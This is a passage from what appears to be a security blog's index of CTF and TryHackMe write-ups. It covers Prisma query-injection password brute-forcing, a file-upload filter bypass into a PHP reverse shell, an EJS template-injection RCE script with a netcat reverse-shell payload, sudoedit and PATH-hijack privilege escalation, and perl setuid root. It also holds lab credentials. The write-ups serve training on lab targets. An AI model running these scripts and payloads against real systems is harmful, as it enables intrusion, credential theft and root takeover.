}    }}resulting in this Prisma query:let posts = await prisma.post.findMany({     where: {        author: {            name: \"Bob\",            password: {                startsWith: \"a\"            }        },        published: true    }});As you can see, nothing is returned, that means that the Bob’s password don’t start with a. I tried b, c, d … And got a hit with 8, meaning that Bob’s password starts with 8 !So now we can try 8a, 8b, 8c and so on … Let’s automate this with python.Scripting (case unsensitive)So I wrote this simple script  brute.py  from requests import getfrom pwn import log # Set of character used (read the seeder.js file)chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"# One of the four usersusername=\"Bob\"passw = \"\"# We know that the password is maximum 24 char (see seed.js)for i in range(24):    # Go through every possible char of the set of character    for char in chars:        # Make the url        url = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][startsWith]={passw+char}\"         req = get(url)        log.info(f\"trying : {passw+char}\")        # If something is returned, that means that it's the correct char        if(len(str(req.json()[\"posts\"])) &gt; 10):            passw += char            log.success(\"FOUND: \" + passw)            break    else:        log.success(\"FINAL: \" + passw)  I launched the script, waited a bit …After a few minutes (yes my network is that bad …) the script told me “Bob’s password is 8AXCGMISH5ZN59RSXJM”. So let’s try to login to the /api/login endpoint with it:Did you noticed something ? There is no lowercases in our password. So I guess the startsWith and endsWith are case-insensitive.Let’s try a different operator:When I put equals, it doesn’t return anything ! So I guess equals is case-sensitive as well as the /api/login endpoint ! We need to find a way to detect if each character is lowercase or uppercase, but how ?Scripting (case sensitive)Fortunately we can put whatever we want in the were clause cause there is no sanitization… So basically we have an SQL query with WHERE X AND published=true and the X is entirely controlled by us ! And fortunately, prisma comes with a ton of operator. To mitigate the case-insne… insin… The case that is not sensitive problem, we can use the gt (greater than) and lt (lower than) operators:Using this request we can test wether the character is lowercase or uppercase:  http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][gt]=8a&amp;author[password][lt]=8zThat will be converted to{    author: {        name: \"Bob\",        password: {            gt: \"8a\",            lt: \"8z\"        }    }}Let’s take a look:Check if the character is between a and z (check if the character is lowercase)Check if the character is between A and Z (check is the character is uppercase)As you can see the second request returns something, that means that the z character is between A and Z. Therefore, it’s uppercase.We can repeat the operation for every character. So I scripted it:  gather_case_sensitivity_test.py  from requests import getfrom pwn import log log.warning(\"Gathering case sensitivity\")passw = \"8AXCGMISH5ZN59RSXJM\"username = \"Bob\"to_test = \"\"for char in passw:    if(char in numbers):        to_test += char        continue    is_lower_url = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][gt]={to_test}a&amp;author[password][lt]={to_test}z\"    log.info(f\"trying : {to_test}\")    is_lower = get(is_lower_url)    if(len(str(is_uppercase.json()[\"posts\"])) &gt; 10):        to_test += char.lower()    else:        to_test += char.upper()log.success(\"Password with correct case is: \" + to_test)  Launch it:Looks like our technique is working !Getting the flagHere is the final version of the script:  exploit.py  from requests import get, postfrom sys import argvfrom pwn import logimport reif(len(argv) != 2):    log.critical(f\"Usage: {argv[0]} &lt;USERNAME&gt;\")    exit()# Set of character used (read the seeder.js file)# But since it's case unsensitive we don't have to check for a and A b and B ...chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"numbers = \"0123456789\"# The username to attack four usersusername = argv[1]passw = \"\"log.warning(\"Gathering password WITHOUT case-sensitivity\")p = log.progress('Bruteforcing (case-unsensitive)')# We know that the password is maximum 24 char (see seeder.js)for i in range(24):    # Go through every possible char of the set of character    for char in chars:        \t# Make &amp; Request the url        url = f\"http://35.239.207.1:3000/api/posts?author[name]={username}&amp;author[password][startsWith]={passw+char}\"         req = get(url)            \tp.status(f\"trying : {passw+char}\")    \t# If something is returned, that means that it's the correct char        if(len(str(req.json()[\"posts\"])) &gt; 10):            passw += char            break    else:        log.success(\"FINAL (CASE-UNSENSITIVE): \" + passw)        p.status(f\"trying : {passw}\")        breaklog.info(\"Gathering case ...\")p = log.progress('Identifying case')to_test = \"\"for char in passw:    if(char in numbers):        to_test += char        continue    is_lower_url = f\"http://35.239.207.1:3000/api/posts?author[name]={username}&amp;author[password][gt]={to_test}a&amp;author[password][lt]={to_test}z\"    is_lower = get(is_lower_url)    p.status(f\"trying : {to_test}\")    if(len(str(is_lower.json()[\"posts\"])) &gt; 10):        to_test += char.lower()    else:        to_test += char.upper()p.success(\"trying: \" + to_test)log.success(\"FINAL (CASE-SENSITIVE): \" + passw)log.info(f\"searching flag in {username}'s posts\")# Login to the /api/login endpointres = post(\turl=\"http://35.239.207.1:3000/api/login\", \theaders={\"Content-Type\": \"application/json\"},\tjson={\"name\": username, \"password\": to_test}).text# Grab the flagif(\"The Flag\" in res):\tprint(re.findall(\"uoftctf{.*}\", res)[0])  It takes a user in argument, search his case unsensitive password, search the case sensitive password, login as the user and search for The Flag post in his posts.Tried it with White (first username in seedjs), but no flag was found. Then I tried it with Bob (second username in seedjs) aaaand:Let’s go !uoftctf{u51n6_0rm5_d035_n07_m34n_1nj3c710n5_c4n7_h4pp3n}"
  },
  
  {
    "title": "Opacity",
    "url": "/posts/thm-opacity/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, php, file-upload, pwncat, linux-privesc",
    "date": "2025-01-02 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Opacity, an Easy rated room on TryHackMe. We will explore the exploitation of the File Upload vulnerability , before moving on to the p...",
    "content": "IntroductionHello everyone, today we will be taking a look at Opacity, an Easy rated room on TryHackMe. We will explore the exploitation of the File Upload vulnerability , before moving on to the privilege escalation phase. Let’s get started !  Enumeration          Portscan      HTTP (80)                  Directory Fuzzing          /cloud/                      Exploitation          Testing file upload      Bypassing the filter      RCE        Privesc          Manual privesc      Sysadmin      Gaining root                  Theory          Practice                    Root      EnumPortscanLet’s start with a basic portscan. As always I to go with rustscan, cause it’s pretty fast, specifying service version and output normal options for the subsequent nmap scan:rustscan -a $TARGET -- -sV -oN all_ports.txtPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 4445/tcp open  netbios-ssn syn-ack Samba smbd 4What do we learn from this portscan ?  The target is likely running linux  SSH, HTTP, and SMB are runningSMB (139, 445)I always start by enumerating file sharing protocols because they often contain juicy. I like to use enum4linux when enumerating samba, to make sure I don’t miss anything.enum4linux $TARGET\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tIPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))[+] Attempting to map shares on 10.10.151.131//10.10.151.131/print$\tMapping: DENIED Listing: N/A Writing: N/A//10.10.151.131/IPC$\tMapping: N/A Listing: N/A Writing: N/AThese are two default shares, and we don’t have access to them. Let’s move on.HTTP (80)Website index pageInteresting ! Maybe we could try bruteforcing the login form, or identifying an SQL injection later. Since we’re still in the enumeration phase, let’s not rush things.Directory fuzzingTime for some directory fuzzing I guess. I’ll use ffuf, and go with the directory-list2.3-medium from SecLists to make sure we don’t miss any hidden directories:ffuf -u \"http://10.10.151.131/FUZZ\" \\     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt {: .radius-shadow }/cloud/Let’s access it from our browser:I’m pretty sure that there’s a file upload vulnerability in here. Let’s try to exploit it !ExploitTesting file uploadAlright, so basically, here’s how the application works:  We provide a link to an image.  It downloads the image and displays it.The first think I want to check is giving a link to an image that doesn’t exist. For example let’s try to enter .png:Seems like there’s no check to verify if the image actually exists. Let’s try uploading .php then.And … The webapp refuses to upload it. So there is probably some kind of filter checking the extension but I don’t know exactly how. Let’s try uploading some real files to see how the webserver responds.So first thing first I launch an http server with python to serve filesmkdir ~/Pictures/Chrootcd ~/Pictures/Chrootpython3 -m http.server 80In the same directory (~/Pictures/Chroot), I create a file named phpinfo.php&lt;?php echo phpinfo();?&gt;Then, I copy it, creating multiple versions with multiple extensions:cp phpinfo.php phpinfo.php.png # Double extension that ends with an image extensioncp phpinfo.php phpinfo.png.php # Double extension that ends with the PHP extensionI tried uploading the .png.php (by giving this url to the webapp: http://ATTACKER_IP/phpinfo.png.php), but it didn’t work.Next I tried the .php.png (by giving this url to the webapp: http://ATTACKER_IP/phpinfo.php.png), It uploaded it but when trying to access it:Bypassing the filterRecently, I was watching a youtube video from John Hammond where he was exploiting an LFI. To bypass a filter, he used a strange filter evasion technique with the #.  The # in a URL is used to denote an anchor or fragment identifier. This tells the browser to navigate to a specific part of the page, typically an element with a corresponding id.I thought: could be a good idea to try.http://ATTACKER_IP/phpinfo.php#.pngPHP code execution!!! Let’s leverage this into a full RCE. And a shoutout to John Hammond.RCEFirst things first I set up a pwncat listener on port 9999.Then I grabbed the pentest monkey’s PHP reverse shell. I modified the IP and the PORT to match mine, placed it in the directory where my HTTP server is running (~/Pictures/Chroot/), and renamed it rev.php. Finally I asked the webapp to load this “image” :http://ATTACKER_IP/rev.php#myfile.pngAs you can see the webapp downloads the rev.php file from my HTTP server and tries to display it. Since it’s a PHP file, it gets interpreted by the web server, and I get my reverse shell !PrivescManual privescI was just poking aroung, looking at common directories, and I found this:(remote) www-data@opacity:/$ cd /opt(remote) www-data@opacity:/opt$ lsdataset.kdbxThis looks like a KeyPass password database ! Let’s download it on our machine.Exfiltrating the KDBX fileUnfortunately this type of file is protected by a password (called “master key”). Fortunately, we can crack it using keepass2john and johnCracking it with johnAll that’s left is to open the KeePass file, input the master key, and steal the protected passwords.Inputing the master key and stealing the passwordsysadmin : Cl0udP4ss40p4city#8700Sysadmin(remote) www-data@opacity:/$ ls /homesysadminSysadmin is a user on this host.(remote) www-data@opacity:/opt$ su sysadminPassword: Cl0udP4ss40p4city#8700sysadmin@opacity:/opt$I tried automatic enumeration with LinPEAS but it didn’t find anything. So, I checked in the sysadmin’s home directory and found a backup script:sysadmin@opacity:~/scripts$ ls -R ..:lib  script.php./lib:application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  xmlapi.phpbackup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.phpAll these files are owned by root. Let’s take a look at the script.php code (here’s a simplified version):&lt;?php//Backup of scripts sysadmin folderrequire_once('lib/backup.inc.php');zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');//Files scheduled removal$dir = \"/var/www/html/cloud/images\";foreach ( files_of($dir) as $file ) {    if($file-&gt;isDir())         rmdir($file);    else:        unlink($file);}?&gt;Alright, so this script basically does two things  zip /home/sysadmin/scripts in /var/backups/backup.zip  delete all images in /var/www/html/cloud/imagesRemember earlier ? The website’s name was 5 minutes upload. That means that root probably executes (via a cronjob or something) the script.php every 5 minutes.To escalate privileges we could simply modify the lib/backup.inc.php file, inject some malicious code, wait 5 minutes and ggs.sysadmin@opacity:~/scripts$ echo &gt; lib/backup.inc.phpbash: scripts/lib/backup.inc.php: Permission deniedsysadmin@opacity:~/scripts$ echo &gt; lib/whatever.phpsysadmin@opacity:~/scripts$ But here is the problem. We can’t write to lib/backup.inc.php (cause it’s owned by root). However we can create files in lib/. So I thought: if we could somehow delete lib/backup.inc.php, we could then create a new one with malicious code, wait 5 minutes, and gain root privileges.But the question is how do we delete it ?Gaining rootTheoryWhile reading the PHP doc for unlink I found this interesting detail:  If the file is a symlink, the symlink will be deleted.If /var/www/html/cloud/images/ was a symlink to ~/scripts/lib/, then when root tries to delete all files from /var/www/html/cloud/images, unlink would follow the symlink, so root would in fact delete all files in ~/scripts/lib/.At that point I’d be able to create a malicious ~/scripts/lib/backup.inc.php. After 5 minutes, root would execute ~/scripts/script.php, including our malicious library, and gg.PracticeHere’s the process I followed step-by-step to set up the symlink and get root to delete their own files. First I need to be www-data (cause it have own on /var/www/html/cloud/).# Step 1: Make sure `sysadmin` can create the symlink herewww-data@opacity:~/opt$ chmod 777 /var/www/html/cloud/# Step 2: Remove the existing images/ directory.www-data@opacity:~/opt$ rm -rf /var/www/html/cloud/images# Step 3: Switch to the sysadmin user to create the symlink.www-data@opacity:~/opt$ su sysadminPassword: Cl0udP4ss40p4city#8700# Step 4: Navigate to the sysadmin's home directory.sysadmin@opacity:~/opt$ cd /home/sysadmin# Step 5: Create the symlink we discussed earlier.sysadmin@opacity:~/home/sysadmin$ ln -sf /home/sysadmin/scripts/lib /var/www/html/cloud/images# Step 6: Verify the contents of the lib directory.sysadmin@opacity:~/home/sysadmin$ ls scripts/lib application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  whatever.phpbackup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.php     xmlapi.php# Step 7: Wait for 5 minutes for the cron job to execute.# Step 8: Verify that root has deleted their own files.sysadmin@opacity:~/home/sysadmin$ ls scripts/lib# files are gone!Nice !And now, all that’s left is to create a malicious ~/scripts/lib/backup.inc.php.# Step 1: Trick root into setting the SUID bit on /bin/bash. sysadmin@opacity:~/home/sysadmin$ echo '&lt;?php shell_exec(\"chmod +s /bin/bash\"); ?&gt;'# Step 2: Verify the current permissions of /bin/bash.sysadmin@opacity:~/home/sysadmin$ ls -l /bin/bash-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash# Step 3: Wait for 5 minutes for the cron job to execute.# Step 4: Check the permissions of /bin/bash again.sysadmin@opacity:~/home/sysadmin$ ls -l /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash# The SUID bit has been set by root!RootTo gain root access we need to execute /bin/bash with the -p option  If the -p option is supplied at invocation, the effective user id is not reset.This means we retain our UID, GID, and all related attributes, but the EUID (Effective User ID) and EGID (Effective Group ID) are NOT reset to ours. Since it’s an SUID binary, they are set to the UID/GID of the owner (root).With this, we can execute commands as root:"
  },
  
  {
    "title": "Whiterose",
    "url": "/posts/thm-whiterose/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, subdomain-fuzzing, idor, ssti, ejs, scripting, linux-privesc",
    "date": "2025-01-01 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Whiterose, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Express.js webapp through IDOR and SSTI, b...",
    "content": "IntroductionHello everyone, today we will be taking a look at Whiterose, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Express.js webapp through IDOR and SSTI, before moving on to the privilege escalation phase. Let’s get started !  Enumeration          Portscan      HTTP (80)                  Directory Fuzzing          Virtual Host fuzzing          Admin Subdomain                          User access              Admin access                                Identifying the template engine          Looking for vulnerabilities                      Exploitation          CVE-2024-33883      CVE-2023-29827      CVE-2022-29078                  Writing a scripting          Getting RCE                      Privesc          sudo -l      Sudoedit      EnumPortscanLet’s start with a basic portscan. I like to go with rustscan cause it’s quite fast. As always, I go with service version enumeration and output normal options:rustscan -a $TARGET -- -sV -oN all_ports.txt22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.14.0 (Ubuntu)What do we learn from this portscan ?  The target is likely running linux  SSH and HTTP are runningHTTP (80)Usually, SSH isn’t a primary target in CTFs, unlike HTTP, so let’s start with that.It’s trying to redirect us to a domain.I added this domain to my /etc/hosts file with this bash one-liner:sudo bash -c 'echo \"10.10.181.178 cyprusbank.thm\" &gt;&gt; /etc/hosts'Accessing the index page of the new domain.But still nothing interesting.Directory FuzzingI thought maybe trying some directory fuzzing could be a good idea.You can use whatever tool you like (gobuster, dirbuster, dirb…). I’ll go with ffuf:ffuf -u \"http://cyprusbank.thm/FUZZ\" -w /usr/share/wordlists/common.txtindex.html              [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 368ms]ffuf -u \"http://cyprusbank.thm/FUZZ\" -w /usr/share/wordlists/big.txt// nothing foundI tried the common.txt and big.txt wordlists from dirb, but I still didn’t find anything.Virtual Host fuzzingSince we have a domain name, trying virtual host fuzzing might be a good idea. I’ll go with wfuzz but you can use ffuf or gobuster as mentioned in the article.wfuzz -u cyprusbank.thm -H \"Host: FUZZ.cyprusbank.thm\" \\      -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txtGetting the number of words in the response.As you may have noticed, wfuzz shows a different number of words in the response depending on whether the tested domain is an existing virtual host or not. Since we know that a non-existent subdomain returns 3 words, we can ask wfuzz to hide all the responses that contain 3 wordswfuzz -u cyprusbank.thm -H \"Host: FUZZ.cyprusbank.thm\" \\      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\      --hw 3 Hiding responses that contains 3 words.Admin SubdomainOkay, so wfuzz found 1 new interesting subdomain (since www is usually not interesting). Let’s add it to our /etc/hosts file:sudo bash -c 'echo \"10.10.181.178 admin.cyprusbank.thm\" &gt;&gt; /etc/hosts'And access it from our browser:Finally !User accessThe challenge says  And oh! I almost forgot! - You will need these: Olivia Cortez:olivi8These credentials are probably provided so we can log in here. After logging in as Olivia Cortez, we are greeted with this page:After clicking around and exploring the website, I made this table:            Page name      What does it do      Potential vulnerabilities                  /      Show recent payments      N/A (static page)              /search      Search for a bank account      searchbar → XSS,SQLI,SSTI              /settings      We don’t have permissions      N/A              /messages/?c=INT      Show/Send messages      c=INT  → IDOR, SQLI                            chat → SSTI,XSS,SQLi      Since we’re still in the enumeration phase let’s focus on testing the IDOR for now.Here is the /message page:The url carries a query parameter named c, with a default value of 5. Let’s test if it’s vulnerable to an IDOR by incrementing this number. I’ll set it to 1000:Gayle Bev:p~]P@5!6;rs558:qAdmin accessAfter logging in with these credentials, I tried accessing the /settings page.I attempted to change the password of some accounts, but it didn’t work. This probably means we HAVE to exploit this page (the authors wouldn’t have created/protected it with admin privilegess otherwise) but via other vectores.I tried some XSS payloads, but they didn’t work. I also tried SQLmap to check for SQL injection but found nothing. I was quite certain it was an SSTI. So, I started looking around to try to identify the template engine.We know that the backend is written using Express.jsIdentifying the template engineAfter a quick googling search I found this on the Express.js documentation:  The Express application generator uses Pug as its default, but it also supports Handlebars, and EJS, among others.That’s not really helpful … We need to know which template engine is used before exploiting it. So I thought: could we make it crash somehow ? Let’s try submitting the form at /settings without supplying any data (no name, no password).curl -X POST http://admin.cyprusbank.thm/settings \\    --cookie \"connect.sid=s%3AJMq02Cp0CBuP_l8pVqYiIbELNrOjtj_5.nIQtTw015tEtvp2t8PbD%2BDIU%2BQQjebdpolEfR6B7zwM\" \\    -d \"\"&lt;div class=\"alert alert-info mb-3\"&gt;Please enter a valid name&lt;/div&gt;There is probably an initial filter that says, “If there is no name, show this div and exit”. Therefore, we need to provide a name to bypass this first check:curl -X POST http://admin.cyprusbank.thm/settings \\    --cookie \"connect.sid=s%3AJMq02Cp0CBuP_l8pVqYiIbELNrOjtj_5.nIQtTw015tEtvp2t8PbD%2BDIU%2BQQjebdpolEfR6B7zwM\" \\    -d \"name=a\" I use the http command from httpie for the screenshot cause it has cool syntax highlighting that makes the output more readableWe know that it’s EJS, let’s try to find some CVEs !Looking for vulnerabilitiesI looked for EJS on cve.mitre.org and found a few interesting CVEs:EJS cve’s            CVE      Type      Link                  CVE-2024-33883      Prototype pollution      cve.org              CVE-2023-29827      SSTI      cve.org              CVE-2022-29078      SSTI      cve.org              CVE-2017-1000228      RCE      cve.org      ExploitationCVE-2024-33883After searching a bit I found this poc that states:  Attack available condition      Needs control of render().    Needs control of prototype pollution attack vector.              Above two condition holds, RCE attack is available.            I don’t think we have control of a prototype pollution attack vector. It’s an easy room, searching for a prototype pollution in an easy room seems highly improbable. Let’s move on.CVE-2023-29827After searching for POCs on github I came across this repo, the author says that there is no POC for this CVE. Let’s move on.CVE-2022-29078On the CVE Program section of the CVE.org page, there is a link pointing to a blog post of the guy who found the CVE. I read it and thought let’s give it a try.Writing a scriptSo I wrote a POC in python:from requests import Sessionfrom sys import argvdef main(url=\"http://admin.cyprusbank.thm\",          username=\"Gayle Bev\",          password=\"p~]P@5!6;rs558:q\"):    session = Session()    command = argv[1]    # Login    session.post(f\"{url}/login\", data={        \"username\": username,        \"password\": password,    })    # In this page: https://eslam.io/posts/ejs-server-side-template-injection-rce/    # we see this payload: http://localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s    # It is used with the GET method. Let's adapt it for the POST method:    # Sending the malicious post request    print(session.post(f\"{url}/settings\", data={        \"name\": \"a\",         \"password\": \"a\",         \"settings[view options][outputFunctionName]\": f\"x;process.mainModule.require('child_process').execSync('{command}');s\"    }).text)if __name__ == \"__main__\":    if(len(argv) == 1):        print(f\"[!] Usage: {argv[0]} &lt;COMMAND&gt;\")        exit()            main()Getting RCEFirst we need to validate that the running EJS version is affected by this CVE:Testing to send the output of ls through netcatCool ! We have an RCE, and we know that netcat is working. Let’s try to get a reverse shell with netcat then:And we have initial accessPrivescI always start with manual privesc, then run automated scripts. I start with the basics, like sudo -l, searching for SUID binaries, and so on. You can find more in-depth manual privesc techniques for Linux heresudo -lSudoeditAfter some googling, I found an interesting exploit that affects sudoedit:Here is the interesting part of the poc (foundable here):EXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)EDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLEsudo su rootThe script tries to identify which command we’re allowed to run with sudo privileges, then run vim -- /etc/sudoers the_extracted_command. I tried running the script, but it didn’t work … Let’s do it manually:EDITOR=\"vim -- /etc/sudoers\" sudoedit /etc/nginx/sites-available/admin.cyprusbank.thmAnd it worked ! It opened the sudoers file, which I edited as follows:Giving the web user permission to run bash as root.And we’re root !"
  },
  
  {
    "title": "Wonderland",
    "url": "/posts/wonderland/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, fuzzing, pwncat, linux-privesc",
    "date": "2024-12-31 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium rated room on TryHackMe. We’ll explore vertical movement in privilege escalation  Enumeration          Por...",
    "content": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium rated room on TryHackMe. We’ll explore vertical movement in privilege escalation  Enumeration          Portscan      HTTP (80)        Privesc          Alice      Rabbit      Hatter      Root      EnumerationPortscanLet’s start with our usual port scan with rustscan. As always, I go with the -sV (service versions) and -oN (output normal) for the nmap scan that follows.rustscan -a $TARGET_IP -- -sV -oN all_ports┌──(kali㉿kali)-[~]└─$ cat all_ports22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)What do we learn from this portscan ?  The target is running Linux  HTTP and SSH are runningHTTP (80)I hit Ctrl+U on my keyboard to take a look at the source code, but nothing interesting. So I thought maybe trying some directoriy fuzzing could be a good idea ?You can use whatever you like (gobuster, dirbuster, dirb…). I’ll go with ffuf:ffuf -u \"http://$TARGET/FUZZ\" -w /usr/share/wordlists/common.txtimg                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 364ms]index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 365ms]r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 372ms]img probably just contains images and we already saw index.html. So let’s take a look at rTaking a look at /r/I guess we’ll keep going then, let’s try to fuzz the /r/ directory:ffuf -u \"http://$TARGET/r/FUZZ\" -w /usr/share/wordlists/common.txta                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 368ms]index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 890ms]Taking a look at /r/a/It seems like it’s going letter by letter. Let’s use feroxbuster to fuzz recursively, using only letters:feroxbuster -u http://$TARGET/ -w /opt/letters_a-z.txt -d 10Recursively fuzzing with only lettersOkay we could’ve expected that cause the title of the index page was “follow the white rabbit”. Let’s just grab the source code to see what it’s all about. I’ll go with the http command of httpie cause it have cool syntax highlighting which makes the output more readable:Look at the &lt;p&gt; elementLooks like SSH credentials ! That means that we can move on to the privesc part immediatly.PrivescAliceConnectingLet’s connect to the ssh service using alice creds with pwncat. I prefer to use pwncat than a classic ssh client cause it’s more conveniant. With pwncat, I can upload/download files, automate tasks, run built-in privescs script and so on with.If root.txt is in the user folder, user.txt is prolly in the root folderLinpeasTalking about uploading things, it’s time to upload linpeas:It found 2 interesting privesc vectors:╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suidSudoers file: /etc/sudoers.d/alice is readablealice ALL = (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.pyFiles with capabilities (limited to 50):/usr/bin/perl5.26.1 = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/perl = cap_setuid+epThe cap_setuid thing is a quick and easy win to get root on a machine, but Unfortunately:(remote) alice@wonderland:/home/alice$ ls -la /usr/bin/perl5.26.1-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1Only root and users of the hatter group can execute it. So let’s delve in the sudo -l thing.Python scriptSo apparently, we can execute a python script as the rabbit user. Here is the content of this python script:import randompoem = \"\"\"......\"\"\"for i in range(10):    line = random.choice(poem.split(\"\\n\"))    print(\"The line was:\\t\", line)First I thought: it’s in our home directory, let’s just modify it ! Unfortunately it’s owned by root, so we can’t edit it:(remote) alice@wonderland:/home/alice$ ls -la walrus_and_the_carpenter.py -rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.pySo only thing that is exploitable here is the import random. If we could somehow modify the random module, we would be able to escalate our privileges. There is a simple python command that allows you to see where python “searches” the modules that it imports:(remote) alice@wonderland:/home/alice$ python3 -m sitesys.path = [    '/home/alice',    '/usr/lib/python36.zip',    '/usr/lib/python3.6',    '/usr/lib/python3.6/lib-dynload',    '/usr/local/lib/python3.6/dist-packages',    '/usr/lib/python3/dist-packages',]USER_BASE: '/home/alice/.local' (exists)USER_SITE: '/home/alice/.local/lib/python3.6/site-packages' (doesn't exist)ENABLE_USER_SITE: TrueAs you can see the first place where python will look is /home/alice. So if we create a file named random.py in /home/alice, then run the python script, python will import /home/alice/random.py. Cool isn’t it ?Nice and easyRabbitRabbit is also not part of the hatter group, so we still can’t execute perl to get root. Not a big deal, let’s take a look at his home directory:rabbit@wonderland:~$ ls -l-rwsr-sr-x root root teaPary  16816 May 25 17:58 teaPartyAnother suid binary owned by root ? Interesting. Let’s get it on our local host to analyze it with ltrace:First the binary set the User ID under which it runs to 1003 and the Group ID under which it runs to 1003 (which is the UID and GID of hatter).(remote) rabbit@wonderland:/home/rabbit$ cat /etc/passwd | grep 1003hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bashThen is executes a system command but the command is truncated. Let’s use gdb to have a deeper understanding of what this fellow does:gdb ./teaPartyOk so the command that this binary executes is the date command.There is a huge mistake in here: the binary is not calling the date command with it’s full path (/usr/bin/date). That means that the shell will search in every directory in the $PATH environement variable if there is a command called date. So by doing simple PATH hijacking we are able to escalate to hatter.HatterThere is still problem: look at the gid of hatter (the terminal on the right side). It’s still rabbit, and we saw earlier that perl was executable only by users of the hatter group. Fortunatelly, the authors of the CTF knew that:(remote) hatter@wonderland:/home/hatter$ cat password.txt WhyIsARavenLikeAWritingDesk?So we can just SSH via pwncat:pwncat ssh://hatter:WhyIsARavenLikeAWritingDesk?@$TARGET[20:30:51] Welcome to pwncat !10.10.189.75:22 registered new whost w/ db(local) pwncat$ ^D(remote) hatter@wonderland:/home/hatter$ iduid=1003(hatter) gid=1003(hatter) group=1003(hatter) RootWe finally have our user from the hatter group, so we’re finally able to exploit the perl with setuid capability.Taking a look at GTFObins we find what we were looking for.GTFObins perl SUID command to privesc(remote) hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'(remote) root@wonderland:/home/hatter$ cat /home/alice/root.txtthm{REDACTED}"
  },
  
  {
    "title": "xsserve",
    "url": "/posts/xsserve/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-12-30 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis tool simplifies XSS exploitation by combining a socket-based HTTP server with the power of ngrok. It enables you to quickly launch a local server and make it publicly accessible, making...",
    "content": "🚀 UsageThis tool simplifies XSS exploitation by combining a socket-based HTTP server with the power of ngrok. It enables you to quickly launch a local server and make it publicly accessible, making it easier to share payloads or demonstrate XSS vulnerabilities.There are basically three endpoints:            Endpoint      What does it to                  /FILENAME      Serves the file named FILENAME in the files/ directory, like a standard HTTP server.              /*      Logs any access to other endpoints directly in your console, giving you full visibility into unexpected requests.      Ideal for pentesters, security researchers, and cybersecurity enthusiasts who need a lightweight and versatile tool for XSS testing.Some CLI argument are provided to enhance user experience:            Argument      What does it to                  -v, --verbose      By default, only the first line of every request and the body are printed. With -v, all headers sent along with the request are also printed              -p, --port      By default, xsserve listens on a random port between 65000 and 65100. With -p you can specify a custom port              -n, --ngrok      Launches an ngrok tunnel that listens on the xsserve port. Ngrok provides a public address, which is useful if you don’t have a VPS or don’t want to set up port forwarding.      SourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Attacktive Directory",
    "url": "/posts/thm-attacktivedirectory/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, active-directory, impacket, asreproast, kerberos, golden-ticket",
    "date": "2024-12-29 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium guided room on TryHackMe. We’ll explore the exploitation of a vulnerable Domain Controller via ASRepRoasti...",
